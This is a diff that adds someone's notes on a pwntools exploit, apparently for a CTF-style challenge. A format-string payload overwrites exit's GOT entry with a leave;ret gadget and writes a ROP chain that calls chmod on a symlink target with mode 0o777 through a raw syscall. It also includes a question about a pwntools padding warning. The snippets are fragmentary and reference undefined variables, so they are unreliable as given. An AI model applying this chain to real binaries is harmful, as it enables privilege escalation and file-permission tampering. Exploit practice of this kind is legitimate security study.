@@ -1,0 +1,49 @@
+
+replacement = {
+        # exit() -> leave; ret
+        elf.got.exit: rop.find_gadget([ 'leave', 'ret' ]).address,
+
+        # rdi = &'group'
+        rsp_addr + 0: libc_base + rop.find_gadget(['pop rdi', 'ret']).address,
+        rsp_addr + 8: libc_base + next(libc.search(f'{symlink}\0'.encode())),
+
+        # rsi = 0o777
+        rsp_addr + 16: libc_base + rop.find_gadget(['pop rsi', 'ret']).address,
+        rsp_addr + 24: 0o777,
+
+        # rax = 0x5a
+        rsp_addr + 32: libc_base + rop.find_gadget(['pop rax', 'ret']).address,
+        rsp_addr + 40: 0x5a,
+
+        # chmod(&'group', 0o777)
+        rsp_addr + 48: libc_base + rop.find_gadget(['syscall']).address,
+
+        # RIP -> RSP
+        rsp_addr + 0x4e0 + 8: rsp_addr,
+    }
+
+  I am getting this warning from pwn tools padding is negative, this will not work on glibc
+
+What I am trying to do is
+1. Write leave; ret gadget's address on GOT table's exit address
+2. Writing ROP chain on RSP --- RSP + 48
+3. Writing RSP's address on RIP  
+
+ payload = [
+        b'a' * 4,
+        fmtstr_payload(48, replacement, write_size = 'int', numbwritten = len(leading))
+    ]
+
+payload = b''
+    payload += b'a' * 4
+    payload += fmtstr_payload(48, rip_replacement, write_size = 'int', numbwritten = len(leading))
+    
+    # 76 bytes len so far
+    # print(len(payload))
+    payload += b'b' * (1024 + 4)
+    payload += fmtstr_payload(48 + 138, chmod_replacement, write_size = 'int', numbwritten = len(payload))    
+
+
+. Use padded addresses like this, idk if it will make a difference though : p64(base + pop_rdi).ljust(8, b"\x00")
+
+info proc mapping // to check libc base address
